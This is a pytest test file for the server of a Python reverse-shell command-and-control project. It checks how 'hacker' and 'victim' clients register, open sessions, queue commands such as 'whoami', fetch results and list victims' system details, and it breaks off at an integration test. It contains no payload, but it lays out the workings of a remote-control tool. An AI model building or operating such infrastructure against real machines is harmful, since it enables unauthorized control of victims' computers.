import json as js
from http import HTTPStatus as st
from http.client import HTTPConnection
from sqlite3 import Cursor

import helper as hp
import pytest
from reverse_shell.server.server_helper import Response

import reverse_shell.utils as ut


@pytest.fixture(scope="function")
def db_cursor():
    # yields the database cursor and erases all data after the test finishes
    db_cursor = hp.database.session_data.cursor()
    yield db_cursor
    # ---------- The tear down
    # First get all the table names from the database
    db_cursor.execute("SELECT tbl_name FROM sqlite_master")
    tbl_names = list(set([tbl_name[0] for tbl_name in db_cursor.fetchall()]))
    # Let's remove the duplicates

    # Now delete all rows from each one of them
    for tbl_name in tbl_names:
        db_cursor.execute(f"DELETE FROM {tbl_name}")


# Some helper functions
def create_hacker(hacker_id: str, db_cursor: Cursor):
    db_cursor.execute(
        "INSERT INTO clients VALUES(?, ?, 0.0, 1)", (hacker_id, ut.ClientType.hacker)
    )


def create_victim(
    victim_id: str,
    db_cursor: Cursor,
    victim_info: tuple[str | None, str | None, str | None, str | None, str | None] = (
        None,
        None,
        None,
        None,
        None,
    ),
):
    """Create a victim using the parameters, the order of the victim_info param is as follows:
    host_name, OS, ARCH, CPU and RAM"""
    db_cursor.execute(
        "INSERT INTO clients VALUES(?, ?, 0.0, 1)", (victim_id, ut.ClientType.victim)
    )
    db_cursor.execute(
        "INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)",
        (victim_id, *victim_info),
    )


def get_cmd_id(command_name: str):
    """Make sure you know the command exists and is unique to get proper results."""
    return [
        key for key, value in hp.config.server_cmds.items() if value == command_name
    ][0]


@pytest.mark.parametrize(
    "headers, res_code",
    [
        ({}, st.BAD_REQUEST),
        (
            {"Authorization": f"Basic {ut.encode_token(hp.config.auth_token)}"},
            st.BAD_REQUEST,
        ),
        (
            {
                "Authorization": "Basic IMessedUpTheToken",
                "client-id": ut.generate_token(),
            },
            st.UNAUTHORIZED,
        ),
        ({"client-id": ut.generate_token()}, st.UNAUTHORIZED),
        (
            {
                "Authorization": f"Basic {ut.encode_token(hp.config.auth_token)}",
                "client-id": ut.generate_token(),
            },
            st.OK,
        ),
    ],
)
def test_check_verified_request(
    client: HTTPConnection, headers: dict[str, str], res_code: st
):
    # Let's send our request to the server using the client fixture
    # let's update the signature because now / is open to everyone.
    client.request("GET", "/verify", headers=headers)
    assert client.getresponse().status == res_code


@pytest.fixture
def verified_client_header():
    return {
        "Authorization": f"Basic {ut.encode_token(hp.config.auth_token)}",
        "client-id": ut.generate_token(),
    }


@pytest.fixture
def verified_hacker_header():
    return {
        "Authorization": f"Basic {ut.encode_token(hp.config.auth_token)}",
        "client-id": ut.generate_token(),
        "hacker-token": ut.encode_token(hp.config.hacker_token),
    }


# ---------- Testing command 'verify' ---------- #
# This command's path
register_cmd_path = get_cmd_id(ut.ServerCommands.register)


@pytest.mark.parametrize(
    "client_type",
    [(ut.ClientType.hacker), (ut.ClientType.victim)],
)
def test_register_basic(
    client: HTTPConnection,
    db_cursor: Cursor,
    verified_client_header: dict[str, str],
    client_type: int,
):
    # request the server for the verify command using our verified_client_header
    # before that store the client_id for further usage.
    client_id = verified_client_header["client-id"]
    client.request(
        "POST",
        f"/{register_cmd_path}",
        headers={
            **verified_client_header,
            "client-type": client_type.__str__(),
            "hacker-token": ut.encode_token(hp.config.hacker_token),
        },
    )
    # First let's check for the response_code
    assert client.getresponse().status == st.OK

    # Now let's check if all the required data is written in
    # the database
    db_cursor.execute("SELECT * FROM clients WHERE client_id=?", (client_id,))
    # Now let's check if we have results returned since the database is brand new
    # the only row will be the one inserted when we requested the verify command
    # so we just need to check if there is something
    assert db_cursor.fetchone() is not None

    # if the client is a victim then we need to also check for the victim_info
    # table and make sure all fields are None there.
    if client_type == ut.ClientType.victim:
        db_cursor.execute("SELECT * FROM victim_info WHERE id=?", (client_id,))
        # First check if we even correctly inserted data into the victim_info dictionary
        victim_info = db_cursor.fetchone()
        assert victim_info is not None
        # Now check for their values, mind you they must be all None
        # we sliced the victim_info because we know that the key(id) is not
        # and should not be None.
        assert all([True if val is None else False for val in victim_info[1:]])


@pytest.mark.parametrize(
    "req_body",
    [
        (
            {
                "host_name": "user123",
                "os": "Windows",
                "arch": "x86",
                "cpu": "AMD Ryzen 7",
                "ram": "16GB",
            }
        ),
        ({"os": "MacOS", "arch": "ARM"}),
        ({}),
    ],
)
def test_register_victim_with_body(
    client: HTTPConnection,
    db_cursor: Cursor,
    verified_client_header: dict[str, str],
    req_body: dict[str, str],
):
    # Let's first encode and send the req_body to our server
    encoded_body = ut.encode_token(js.dumps(req_body))
    client_id = verified_client_header["client-id"]
    # Now let's request
    client.request(
        "POST",
        f"/{register_cmd_path}",
        body=encoded_body,
        headers={
            **verified_client_header,
            "client-type": ut.ClientType.victim.__str__(),
        },
    )
    # First check if the status code is correct
    assert client.getresponse().status == st.OK

    # Let's check for every key the req_body has to offer
    # we're gonna select it in SQL
    for key, val in req_body.items():
        # Now check for the data, so first check for it's existence
        db_cursor.execute(
            "SELECT ? FROM victim_info WHERE id=?",
            (
                key,
                client_id,
            ),
        )
        result = db_cursor.fetchone()
        assert result is not None
        assert req_body[result[0]] == val


def test_register_when_victim_exists(
    client: HTTPConnection, verified_client_header, db_cursor: Cursor
):
    # Insert a client directly to the database and test if
    # request verify with the same client id yields a conflict status
    # we'll use client type victim cuz changing client types now doesn't
    # make a difference now.

    client_id = verified_client_header["client-id"]
    # Create sample victim
    create_victim(client_id, db_cursor)

    # Now let's check if the requests yield a conflict response
    client.request(
        "POST",
        f"/{register_cmd_path}",
        headers={
            **verified_client_header,
            "client-type": ut.ClientType.victim.__str__(),
        },
    )

    assert client.getresponse().status == st.CONFLICT


# ---------- Testing command 'create_session' ---------- #
create_session_path = get_cmd_id(ut.ServerCommands.create_session)


def test_create_session_without_body(
    client: HTTPConnection,
    db_cursor: Cursor,
    verified_hacker_header: dict[str, str],
):
    hacker_id = verified_hacker_header["client-id"]
    # Create a sample hacker because we need to use it.
    create_hacker(hacker_id, db_cursor)

    client.request("POST", f"/{create_session_path}", headers=verified_hacker_header)

    assert client.getresponse().status == st.BAD_REQUEST


def test_create_session_with_invalid_victim(
    client: HTTPConnection,
    db_cursor: Cursor,
    verified_hacker_header: dict[str, str],
):
    victim_id = ut.generate_token()

    hacker_id = verified_hacker_header["client-id"]
    # Create a sample hacker because we need to use it.
    create_hacker(hacker_id, db_cursor)

    client.request(
        "POST",
        f"/{create_session_path}",
        body=ut.encode_token(victim_id),
        headers=verified_hacker_header,
    )

    assert client.getresponse().status == st.BAD_REQUEST


def test_create_session_with_victim_already_in_session(
    client: HTTPConnection,
    db_cursor: Cursor,
    verified_hacker_header: dict[str, str],
):
    # Create sample victim
    victim_id = ut.generate_token()
    create_victim(victim_id, db_cursor)

    hacker_id = verified_hacker_header["client-id"]
    # Create a sample hacker because we need to use it.
    create_hacker(hacker_id, db_cursor)

    # faking a session with a hacker for the victim
    hp.sessions.add_session(hacker_id, victim_id)

    client.request(
        "POST",
        f"/{create_session_path}",
        body=ut.encode_token(victim_id),
        headers=verified_hacker_header,
    )

    assert client.getresponse().status == st.FORBIDDEN


def test_create_session_for_session_id_in_body_as_hacker(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    # Create the hacker
    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    # Now create a victim
    victim_id = ut.generate_token()
    create_victim(victim_id, db_cursor)

    # And finally make the request to establish the
    # session with the client
    client.request(
        "POST",
        f"/{create_session_path}",
        body=ut.encode_token(victim_id),
        headers=verified_hacker_header,
    )

    # Validating the result
    response = client.getresponse()

    content_size = response.getheader("content-length")

    if content_size is None:
        assert False

    # Decoding and reading the response body
    raw_response = response.read(int(content_size)).decode("utf8")
    session_id = ut.decode_token(raw_response)

    # Now let's compare our session ID with what's already there
    assert (
        hp.sessions.get_session(session_id)["hacker_id"] == hacker_id
        and hp.sessions.get_session(session_id)["victim_id"] == victim_id
    )


def test_create_session_when_hacker_in_multiple_valid_sessions(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    victim1_id, victim2_id = ut.generate_token(), ut.generate_token()
    create_victim(victim1_id, db_cursor)
    create_victim(victim2_id, db_cursor)

    # Now let's create session between the one hacker and
    # the multiple sessions
    client.request(
        "POST",
        f"/{create_session_path}",
        body=ut.encode_token(victim1_id),
        headers=verified_hacker_header,
    )

    # this should produce an OK response and we should
    # have the hacker tied up to the first victim in our session manager
    response = client.getresponse()

    assert response.status == st.OK

    content_size = response.getheader("content-length")

    if content_size is None:
        assert False

    # Decoding and reading the response body
    raw_response = response.read(int(content_size)).decode("utf8")
    session_id = ut.decode_token(raw_response)

    assert (
        hp.sessions.get_session(session_id)["hacker_id"] == hacker_id
        and hp.sessions.get_session(session_id)["victim_id"] == victim1_id
    )

    client.request(
        "POST",
        f"/{create_session_path}",
        body=ut.encode_token(victim2_id),
        headers=verified_hacker_header,
    )

    # this should produce an OK response and we should
    # have the hacker tied up to the first victim in our session manager
    response = client.getresponse()

    assert response.status == st.FORBIDDEN  # Since the hacker was in a session


def test_create_session_when_hacker_has_exited_from_another_session(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    # Create the victim and the hacker, exit(kill the session) and
    # try to create another session with another client.
    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    victim_id = ut.generate_token()
    create_victim(victim_id, db_cursor)

    session_id = hp.sessions.add_session(hacker_id, victim_id)
    # Now kill the session, remove it from the client_list and the sessions map
    # this emulates the condition when the hacker exits a session.
    hp.sessions.kill_session(session_id)
    hp.sessions._client_list.remove(hacker_id)
    hp.sessions._sessions[session_id]["hacker_id"] = None

    # And now let's try to create a session with another
    # victim
    victim2_id = ut.generate_token()
    create_victim(victim2_id, db_cursor)

    client.request(
        "POST",
        f"/{create_session_path}",
        body=ut.encode_token(victim2_id),
        headers=verified_hacker_header,
    )

    response = client.getresponse()
    assert response.status == st.OK

    content_length = response.getheader("content-length")
    if content_length is None:
        assert False

    session_id = ut.decode_token(response.read(int(content_length)).decode())

    assert hp.sessions.get_session_id(hacker_id) == session_id


def test_create_session_properly(
    client: HTTPConnection,
    db_cursor: Cursor,
    verified_hacker_header: dict[str, str],
):
    # Create sample victim
    victim_id = ut.generate_token()
    create_victim(victim_id, db_cursor)

    hacker_id = verified_hacker_header["client-id"]
    # Create a sample hacker because we need to use it.
    create_hacker(hacker_id, db_cursor)

    client.request(
        "POST",
        f"/{create_session_path}",
        body=ut.encode_token(victim_id),
        headers=verified_hacker_header,
    )

    assert client.getresponse().status == st.OK

    # Also check in the hacking_sessions table
    assert hp.sessions.check_client_in_session(victim_id)


# ---------- Testing command 'post_cmd' ---------- #
post_cmd_path = get_cmd_id(ut.ServerCommands.post_cmd)


def test_post_cmd_with_dead_session(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    # That generally means no victim was ever created
    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    request_body = js.dumps(
        {
            "session_id": ut.generate_token(),  # A fake token(i.e the session isn't running)
            "command": "whoami",
            "empty": False,
        }
    )

    client.request(
        "POST",
        f"/{post_cmd_path}",
        body=ut.encode_token(request_body),
        headers=verified_hacker_header,
    )

    assert client.getresponse().status == st.NOT_ACCEPTABLE


def test_post_cmd_with_victim_in_session(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    # Let's create a hacker and a victim
    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    victim_id = ut.generate_token()
    create_victim(victim_id, db_cursor)

    # Let's put the victim in session with supposedly another hacker
    session_id = hp.sessions.add_session(ut.generate_token(), victim_id)

    request_body = js.dumps(
        {"session_id": session_id, "command": "whoami", "empty": False}
    )

    client.request(
        "POST",
        f"/{post_cmd_path}",
        body=ut.encode_token(request_body),
        headers=verified_hacker_header,
    )

    assert client.getresponse().status == st.NOT_ACCEPTABLE


def test_post_cmd_with_victim_in_other_session_and_hacker_in_another(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    # Let's create a hacker and a victim
    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    victim_id = ut.generate_token()
    create_victim(victim_id, db_cursor)

    # And let's put the hacker inside another session
    hp.sessions.add_session(hacker_id, ut.generate_token())
    # Let's put the victim in session with supposedly another hacker
    session_id = hp.sessions.add_session(ut.generate_token(), victim_id)

    request_body = js.dumps(
        {"session_id": session_id, "command": "whoami", "empty": False}
    )

    client.request(
        "POST",
        f"/{post_cmd_path}",
        body=ut.encode_token(request_body),
        headers=verified_hacker_header,
    )

    assert client.getresponse().status == st.NOT_ACCEPTABLE


def test_post_cmd_without_body(
    client: HTTPConnection,
    db_cursor: Cursor,
    verified_hacker_header: dict[str, str],
):
    # Create victim and hacker
    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    victim_id = ut.generate_token()
    create_victim(victim_id, db_cursor)

    # Let's put the hacker in session with the victim
    hp.sessions.add_session(hacker_id, victim_id)

    client.request(
        "POST",
        f"/{post_cmd_path}",
        body="",
        headers=verified_hacker_header,
    )

    assert client.getresponse().status == st.BAD_REQUEST


def test_post_cmd_with_empty_flag(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    # Create the victim and the hacker
    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    victim_id = ut.generate_token()
    create_victim(victim_id, db_cursor)

    # putting the hacker in session with the victim
    session_id = hp.sessions.add_session(hacker_id, victim_id)

    request_body = js.dumps({"session_id": session_id, "command": "", "empty": True})

    client.request(
        "POST",
        f"/{post_cmd_path}",
        body=ut.encode_token(request_body),
        headers=verified_hacker_header,
    )

    assert client.getresponse().status == st.CREATED

    # Check if the session comm is modified accordingly
    assert hp.sessions.get_command(session_id) is None


def test_post_cmd_properly(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    # Create the victim and the hacker
    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    victim_id = ut.generate_token()
    create_victim(victim_id, db_cursor)

    # putting the hacker in session with the victim
    session_id = hp.sessions.add_session(hacker_id, victim_id)

    cmd = "whoami"
    request_body = js.dumps({"session_id": session_id, "command": cmd, "empty": False})

    client.request(
        "POST",
        f"/{post_cmd_path}",
        body=ut.encode_token(request_body),
        headers=verified_hacker_header,
    )

    assert client.getresponse().status == st.CREATED

    # Check if the session comm is modified accordingly
    assert hp.sessions.get_command(session_id) == cmd


# ---------- Testing command "get_session" ---------- #
get_session_path = get_cmd_id(ut.ServerCommands.get_session)


def test_get_session_without_a_session(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    client_id = verified_client_header["client-id"]
    create_victim(client_id, db_cursor)

    # Let's request to get a session even though we are not
    # in one
    client.request("GET", f"/{get_session_path}", headers=verified_client_header)

    assert client.getresponse().status == st.NOT_FOUND


def test_get_session_with_a_session(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    client_id = verified_client_header["client-id"]
    create_victim(client_id, db_cursor)

    # Let's put the victim in a session with the hacker(well a fake one)
    session_id = hp.sessions.add_session(client_id, ut.generate_token())

    client.request("GET", f"/{get_session_path}", headers=verified_client_header)

    response = client.getresponse()

    # Check if the status code was right
    assert response.status == st.OK

    # And now if the session_id is correct
    content_length = response.getheader("content-length")

    # Check it false if the content length doesn't even exist
    if content_length is None:
        assert False

    server_sent_session_id = response.read(int(content_length)).decode()
    server_sent_session_id = ut.decode_token(server_sent_session_id)

    assert session_id == server_sent_session_id


# --------- Test the fetch_cmd command ---------- #
fetch_cmd_path = get_cmd_id(ut.ServerCommands.fetch_cmd)


def test_fetch_cmd_without_a_session_or_body(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    # Simple, create the client and let's see that the server
    # responds with a NOT_FOUND since the victim ain't really in a session
    victim_id = verified_client_header["client-id"]
    create_victim(victim_id, db_cursor)

    client.request("GET", f"/{fetch_cmd_path}", headers=verified_client_header)

    assert client.getresponse().status == st.BAD_REQUEST


def test_fetch_cmd_with_a_fake_session(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    # Simple, create the client and let's see that the server
    # responds with a NOT_FOUND since the victim is really in a fake session
    victim_id = verified_client_header["client-id"]
    create_victim(victim_id, db_cursor)

    fake_session_id = ut.encode_token(ut.generate_token())

    client.request(
        "GET",
        f"/{fetch_cmd_path}",
        headers=verified_client_header,
        body=fake_session_id,
    )

    assert client.getresponse().status == st.NOT_ACCEPTABLE


def test_fetch_cmd_in_a_session_but_with_an_empty_command(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    # This is also simple, but now we emulate a situation where the hacker hasn't
    # inserted a command, and we just fetch nothing
    victim_id = verified_client_header["client-id"]
    create_victim(victim_id, db_cursor)

    # Create the hacker and establish session
    hacker_id = ut.generate_token()
    create_hacker(hacker_id, db_cursor)

    session_id = hp.sessions.add_session(hacker_id, victim_id)
    session_id = ut.encode_token(session_id)

    # Now make a fetch_cmd command with the session
    client.request(
        "GET", f"/{fetch_cmd_path}", body=session_id, headers=verified_client_header
    )

    assert client.getresponse().status == st.NO_CONTENT


def test_fetch_cmd_in_session_with_command(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    # Now we're going to do multiple things
    # First setup a hacker and victim and put them in a session
    # Then emulate the post_cmd for the hacker
    # request with the fetch_cmd with the session_id
    # verify if the command is correctly received

    victim_id = verified_client_header["client-id"]
    create_victim(victim_id, db_cursor)

    hacker_id = ut.generate_token()
    create_hacker(hacker_id, db_cursor)

    session_id = hp.sessions.add_session(hacker_id, victim_id)

    # Insert a command into the session comm
    cmd = "whoami"
    hp.sessions.insert_command(session_id, cmd)
    session_id = ut.encode_token(session_id)

    client.request(
        "GET", f"/{fetch_cmd_path}", body=session_id, headers=verified_client_header
    )

    response = client.getresponse()

    assert response.status == st.OK

    content_length = response.getheader("content-length")
    if content_length is None:
        assert False

    server_sent_command = response.read(int(content_length)).decode()
    server_sent_command = ut.decode_token(server_sent_command)

    assert server_sent_command == cmd


# ---------- Test command 'post_res' ---------- #
post_res_path = get_cmd_id(ut.ServerCommands.post_res)


def test_post_res_with_dead_session(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    # First create the victim
    victim_id = verified_client_header["client-id"]
    create_victim(victim_id, db_cursor)

    # Now let's prepare the request body
    req_body = js.dumps(
        {
            "session_id": ut.generate_token(),  # This supposed to be the non-existing session_id
            "response": "Some random response",
            "empty": False,
            "command_status_code": None,
        }
    )

    # Now send this data to the server
    client.request(
        "POST",
        f"/{post_res_path}",
        body=ut.encode_token(req_body),
        headers=verified_client_header,
    )

    assert client.getresponse().status == st.NOT_ACCEPTABLE


def test_post_res_using_a_session_id_belonging_to_another_session(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    # Let's start by creating the victim and the hacker
    victim_id = verified_client_header["client-id"]
    create_victim(victim_id, db_cursor)

    hacker_id = ut.generate_token()
    create_hacker(hacker_id, db_cursor)

    # and now let's put the victim and the hacker in different sessions
    # with different people
    session_id = hp.sessions.add_session(hacker_id, ut.generate_token())
    hp.sessions.add_session(ut.generate_token(), victim_id)

    # build the request_body
    req_body = js.dumps(
        {
            "session_id": session_id,
            "response": "Just a simple response",
            "empty": False,
            "command_status_code": None,
        }
    )

    # Now try requesting the server
    client.request(
        "POST",
        f"/{post_res_path}",
        body=ut.encode_token(req_body),
        headers=verified_client_header,
    )

    assert client.getresponse().status == st.NOT_ACCEPTABLE


def test_post_res_without_providing_the_body(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    # This might change a bit since we really don't really need to put the
    # victim in session with the hacker, because the body error will be detected before
    # the session error
    victim_id = verified_client_header["client-id"]
    create_victim(victim_id, db_cursor)

    # Now let's just send the request
    client.request("POST", f"/{post_res_path}", headers=verified_client_header)

    assert client.getresponse().status == st.BAD_REQUEST


def test_post_res_with_invalid_body(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    # Same with the above this differs because it is an invalid body
    # rather no body at all like the before
    victim_id = verified_client_header["client-id"]
    create_victim(victim_id, db_cursor)

    req_body = js.dumps({"response": "Something I can help?"})

    # Now let's just send the request
    client.request(
        "POST",
        f"/{post_res_path}",
        body=ut.encode_token(req_body),
        headers=verified_client_header,
    )

    assert client.getresponse().status == st.BAD_REQUEST


def test_post_res_with_with_empty_flag(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    # Now let's do everything as expected and try it
    victim_id = verified_client_header["client-id"]
    create_victim(victim_id, db_cursor)

    hacker_id = ut.generate_token()
    create_hacker(hacker_id, db_cursor)

    # Putting the hacker and victim inside a session
    session_id = hp.sessions.add_session(hacker_id, victim_id)

    req_body = js.dumps(
        {
            "session_id": session_id,
            "response": "",
            "empty": True,
            "command_status_code": None,
        }
    )

    client.request(
        "POST",
        f"/{post_res_path}",
        body=ut.encode_token(req_body),
        headers=verified_client_header,
    )

    # Now check both the status code and the session communications if the needed
    # response is added in the correct place.
    response = client.getresponse()

    assert response.status == st.OK

    remote_res = hp.sessions.get_response(session_id)

    assert remote_res == []


def test_post_res_properly(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    # Now let's do everything as expected and try it
    victim_id = verified_client_header["client-id"]
    create_victim(victim_id, db_cursor)

    hacker_id = ut.generate_token()
    create_hacker(hacker_id, db_cursor)

    # Putting the hacker and victim inside a session
    session_id = hp.sessions.add_session(hacker_id, victim_id)
    res = "testing"

    req_body = js.dumps(
        {
            "session_id": session_id,
            "response": res,
            "empty": False,
            "command_status_code": None,
        }
    )

    client.request(
        "POST",
        f"/{post_res_path}",
        body=ut.encode_token(req_body),
        headers=verified_client_header,
    )

    # Now check both the status code and the session communications if the needed
    # response is added in the correct place.
    response = client.getresponse()

    assert response.status == st.OK

    remote_res = hp.sessions.get_response(session_id)[0]["response"]

    assert remote_res == res


# ---------- Testing command 'fetch_res' ---------- #
fetch_res_path = get_cmd_id(ut.ServerCommands.fetch_res)


def test_fetch_res_without_providing_session_id(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    # Ok first create the hacker and then request the server
    # for fetching a response which should respond as bad_request since
    # we don't even provide the body needed

    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    client.request("GET", f"/{fetch_res_path}", headers=verified_hacker_header)

    assert client.getresponse().status == st.BAD_REQUEST


def test_fetch_res_with_invalid_sessions(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    # Now we need to request the server with a session_id that doesn't
    # exist.

    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    fake_session_id = ut.generate_token()

    client.request(
        "GET",
        f"/{fetch_res_path}",
        body=ut.encode_token(fake_session_id),
        headers=verified_hacker_header,
    )

    assert client.getresponse().status == st.NOT_ACCEPTABLE


def test_fetch_res_with_a_valid_session_that_the_hacker_is_not_in(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    # And now we need to test send a request with a session_id
    # occupied by some one else.

    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    other_session = hp.sessions.add_session(ut.generate_token(), ut.generate_token())
    # putting our selves in session to bypass the session check
    hp.sessions.add_session(hacker_id, ut.generate_token())

    client.request(
        "GET",
        f"/{fetch_res_path}",
        body=ut.encode_token(other_session),
        headers=verified_hacker_header,
    )

    assert client.getresponse().status == st.NOT_ACCEPTABLE


def test_fetch_res_when_the_hacker_is_not_in_a_session(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    # Now we need to request the server while we're not in session
    # this should result in a bad_request

    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    other_session = hp.sessions.add_session(ut.generate_token(), ut.generate_token())

    client.request(
        "GET",
        f"/{fetch_res_path}",
        body=ut.encode_token(other_session),
        headers=verified_hacker_header,
    )

    assert client.getresponse().status == st.NOT_ACCEPTABLE


@pytest.mark.parametrize(
    "response",
    [
        ({"response": "just about to finish", "command_status_code": None}),
        ({"response": "finished", "command_status_code": 0}),
    ],
)
def test_fetch_res_when_response_ends(
    client: HTTPConnection,
    db_cursor: Cursor,
    verified_hacker_header: dict[str, str],
    response: Response,
):
    # Check if the end_response works, if the response is an end response it
    # will also give the finished status code.

    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    # Put a hacker and victim in session
    session_id = hp.sessions.add_session(hacker_id, ut.generate_token())

    # Now emulate the case where we send the finished response
    hp.sessions.insert_response(
        session_id, response["response"], response["command_status_code"]
    )

    # Now try to fetch_res
    client.request(
        "GET",
        f"/{fetch_res_path}",
        body=ut.encode_token(session_id),
        headers=verified_hacker_header,
    )

    server_response = client.getresponse()

    assert server_response.status == st.OK

    content_len = server_response.getheader("content-length")
    if content_len is None:
        assert False

    responses = server_response.read(int(content_len)).decode()
    recvd_responses = js.loads(ut.decode_token(responses))

    assert recvd_responses[0]["response"] == response["response"]
    assert recvd_responses[0]["command_status_code"] == response["command_status_code"]


# ---------- Testing command 'list_victims' ---------- #
list_victims_path = get_cmd_id(ut.ServerCommands.list_victims)


def test_list_victims_with_no_victims(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    # Now let's request the server to list the victims, but it should
    # produce no victims i.e an empty array since there are no in the server
    client.request("GET", f"/{list_victims_path}", headers=verified_hacker_header)

    response = client.getresponse()

    # Check if the correct status code was returned
    assert response.status == st.OK

    # Now check the content to be []
    content_length = response.getheader("content-length")

    if content_length is None:
        assert False

    victim_list = response.read(int(content_length)).decode()
    victim_list = ut.decode_token(victim_list)
    decoded_victim_list = js.loads(victim_list)

    # Now check if it is indeed to be an empty list
    assert decoded_victim_list == []


def test_list_victims_with_some_victims(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    # Now let's insert some victims in the database
    client1_id = ut.generate_token()
    client2_id = ut.generate_token()
    client3_id = ut.generate_token()

    client1_info = ("someone", "Windows", "x86", "5th Gen Intel", "8GB")
    client2_info = ("somebody", "MacOS", "ARM", "M2 PRO", "32GB")
    client3_info = ("something", "Debian Linux", "x64", "Ryzen 7 5800", "16GB")

    create_victim(client1_id, db_cursor, client1_info)
    create_victim(client2_id, db_cursor, client2_info)
    create_victim(client3_id, db_cursor, client3_info)

    client.request("GET", f"/{list_victims_path}", headers=verified_hacker_header)
    response = client.getresponse()

    # Check if the correct status code was returned
    assert response.status == st.OK

    expected_content = [
        {
            "client_id": client1_id,
            "host_name": client1_info[0],
            "os": client1_info[1],
            "arch": client1_info[2],
            "cpu": client1_info[3],
            "ram": client1_info[4],
            "status": 1,
        },
        {
            "client_id": client2_id,
            "host_name": client2_info[0],
            "os": client2_info[1],
            "arch": client2_info[2],
            "cpu": client2_info[3],
            "ram": client2_info[4],
            "status": 1,
        },
        {
            "client_id": client3_id,
            "host_name": client3_info[0],
            "os": client3_info[1],
            "arch": client3_info[2],
            "cpu": client3_info[3],
            "ram": client3_info[4],
            "status": 1,
        },
    ]

    # Now check the content to be
    content_length = response.getheader("content-length")

    if content_length is None:
        assert False

    victim_list = response.read(int(content_length)).decode()
    victim_list = ut.decode_token(victim_list)
    decoded_victim_list = js.loads(victim_list)

    # Now check if it is indeed matches the expected
    assert len(decoded_victim_list) == 3

    # Then check if it includes each expected data
    assert decoded_victim_list.sort(
        key=lambda victim_info: victim_info.get("client_id", "A")
    ) == expected_content.sort(
        key=lambda victim_info: victim_info.get("client_id", "A")
    )


# ---------- Testing command 'exit_session' ---------- #
exit_session_path = get_cmd_id(ut.ServerCommands.exit_session)


def test_exit_session_while_not_in_one(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    # Now try to exit without providing a session_id
    client.request("DELETE", f"/{exit_session_path}", headers=verified_hacker_header)

    assert client.getresponse().status == st.BAD_REQUEST


def test_exit_session_when_in_session_but_with_fake_session(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    # Ok let's put ourselves in session
    hp.sessions.add_session(hacker_id, ut.generate_token())
    fake_session_id = ut.encode_token(ut.generate_token())

    client.request(
        "DELETE",
        f"/{exit_session_path}",
        body=fake_session_id,
        headers=verified_hacker_header,
    )

    assert client.getresponse().status == st.NOT_ACCEPTABLE


def test_exit_session_in_valid_session(
    client: HTTPConnection, db_cursor: Cursor, verified_hacker_header: dict[str, str]
):
    hacker_id = verified_hacker_header["client-id"]
    create_hacker(hacker_id, db_cursor)

    # Insert our selves in session
    session_id = hp.sessions.add_session(hacker_id, ut.generate_token())

    # Now request the server with the correct session
    client.request(
        "DELETE",
        f"/{exit_session_path}",
        body=ut.encode_token(session_id),
        headers=verified_hacker_header,
    )

    assert client.getresponse().status == st.OK

    # And now check if the same thing is reflected in the
    # sessions
    session = hp.sessions.get_session(session_id)

    assert not session["alive"]


# ---------- Integration Test ---------- #
def test_normal_flow(
